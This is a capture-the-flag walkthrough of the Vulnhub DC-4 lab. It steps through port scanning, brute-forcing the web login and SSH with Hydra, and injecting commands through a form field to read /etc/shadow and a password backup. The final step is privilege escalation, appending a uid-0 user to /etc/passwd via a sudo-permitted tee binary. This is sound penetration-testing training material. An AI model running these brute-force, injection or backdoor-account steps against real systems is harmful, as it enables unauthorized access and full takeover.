# DC:4 CTF Walkthrough (Vulnhub) 

###### <p align="center"> *This is official repository maintained by me*</center> </p>
###### <p align="center"> *[yigitdrbk](https://www.instagram.com/yigitdrbk/) *</center> </p>

Dc:4 is a CTF created by DCAU. You can find the technical information about this CTF on the Vulnhub page. First of all, make sure to download and install the correct OVA file from Vulnhub. (https://download.vulnhub.com/dc/DC-4.zip).

As described on the Vulnhub page, this CTF challenge is aimed at beginners to intermediate-level participants. According to the author: “DC-4 is another purposely built vulnerable lab designed to help users gain hands-on experience in the field of penetration testing.".
## 1-Recon
After setting your machine’s IP to work on your network, you’re ready to scan. If you can’t reach your machine from another virtual machine or your own computer, you should check your VirtualBox network settings. If you’re trying to reach your machine from another VirtualBox instance, both machines’ network settings should be set to Bridged Adapter or NAT Network. Once that’s configured, you’re ready to start scanning.

To find an IP address on the same network, we can use Nmap or Netdiscover to scan.
```bash
nmap -sn 10.0.2.0/24 or netdiscover -r 10.0.2.0/24
```

My IP is 10.0.2.13, and I’ll start by scanning the open ports, then check for any vulnerabilities they might have. If you’ve made it this far, you probably know how to scan ports, but I’ll give you the command anyway:

```bash
nmap -p- -vv <machine_ip>
nmap -PN -sS -sV --script vuln <machine_ip> -oN finalscan
```

![DC4](https://miro.medium.com/v2/resize:fit:828/format:webp/1*3NmBqWHuP9GqrEU35YCN7g.png "DC4")

There are only two open ports, as shown above: 22 and 80. I didn’t find any vulnerabilities during the initial nmap scan, so I moved on to directory brute-forcing using dirb and dirsearch.

```bash
dirb http://<machine_ip>
dirsearch -u http://<machine-ip>
```

![DC4](https://miro.medium.com/v2/resize:fit:640/format:webp/1*DuQTEJnpQOS-cIbIhgjU4w.png "DC4")

The only suspicious directory I found was command.php. When I visited the website, there was just a login panel. I checked the source code and a few other things, but didn’t find any useful clues. So, I decided to start brute-forcing..

## 2- Brute Force

I started by running Burp Suite and setting up my website proxy. I intercepted the request and sent it to the intruder. After selecting the credentials fields, I set my wordlist to rockyou.txt and ran the attack. However, it was too slow, so I switched to Hydra.

The Hydra command was a bit tricky to figure out. I used developer tools and some AI help to craft it. Here’s the Hydra command I used for the brute-force attack:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <machine_ip> http-post-form "/login.php:username=admin&password=^PASS^:S=command"
```
I found the password for admin easily. It was “happy”.

## 3- Running commands on website

After logging in with the admin credentials, I was redirected to the command.php page. Here, I could list files, view disk usage, and check my current storage capacity. I then attempted to intercept this with Burp Suite. The request looked like this:

![DC4](https://miro.medium.com/v2/resize:fit:828/format:webp/1*LKe5qVRfPAboalumgRVa8w.png "DC4")

I changed the radio value to whoami and received the response www-data. Then, I tried a bunch of commands like cat /etc/passwd, cat /etc/shadow, and explored the /home directory. I found three users in the home directory: charles, jim, and tom.

![DC4](https://miro.medium.com/v2/resize:fit:828/format:webp/1*G07pAiXfHkGZUVmHzQSkOQ.png "DC4")

I checked each folder and found an interesting one.

![DC4](https://miro.medium.com/v2/resize:fit:1100/format:webp/1*nJBDZ3M9kE98P2t9gUm6Ew.png "DC4")

There was file named “old.passwords.bak” in jim’s backup directory.

```bash
radio=cat+/home/jim/backups/old-passwords.bak&submit=Run
```
Getting reverse shell is hard to do from just in burpsuite. But i just copy the output above command and saved it like passwords.txt.

## 4- SSH phase

I tried to brute force with this passwords.

```bash
hydra -l jim -P passwords 10.0.2.13 ssh
```

You can add -t 4 to run faster. I found the jim’s password “jibril04”.

(I tried to brute force tom and charles but it didn’t work.)

Jim’s have mail by root in his home directory. I didn’t understand the mail content.

```bash
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
 (envelope-from <root@dc-4>)
 id 1hCiQe-0000gc-EC
 for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.
```
Then, I searched online and discovered that there’s a directory on the server for users to mail each other: /var/mail. Each user can access their mail directory, so I could read Jim’s emails. There was one email from Charles, in which he mentioned he was going on vacation and shared his password with Jim in case anything happened. Charles’s password is “^xHhA&hvim0y”.

```bash 
su charles
``` 

I switched user to charles and see what’s inside of home/charles.

## 5- Privilege escalation

Charles has root privileges on a specific file: /usr/bin/teehee. After researching, I found out that this is a type of text editor. I discovered that I could append a user with root privileges to /etc/passwd. A typical entry for a normal user in /etc/passwd would look like this:

```bash 
username:$passwordhash:0:0:username:/home/username:/bin/bash
``` 

First, I needed to create a hash. After doing some research, I found a command that allows you to input your password and generates a hash. The command is:

```bash
openssl passwd -1
```
For example if I give you the password “selam” and it hashed like $1$7yVj4i1u$YCPsRLjjCSr0s7x.PJCLs.

Now i should append this with username on etc/passwd file and switch user to this user. I added myself.

```bash
sudo teehee -a /etc/passwd
yigit:$1$7yVj4i1u$YCPsRLjjCSr0s7x.PJCLs.:0:0:yigit:/home/yigit:/bin/bash
```

And then i switch my user to yigit. Now i am root and can reach root director. Final flag here.

![DC4](https://miro.medium.com/v2/resize:fit:828/format:webp/1*1QZvlGB1hQ_mtv5N6b0seg.png "DC4")

Developer / Author: [yigitdrbk](https://www.instagram.com/yigitdrbk/)
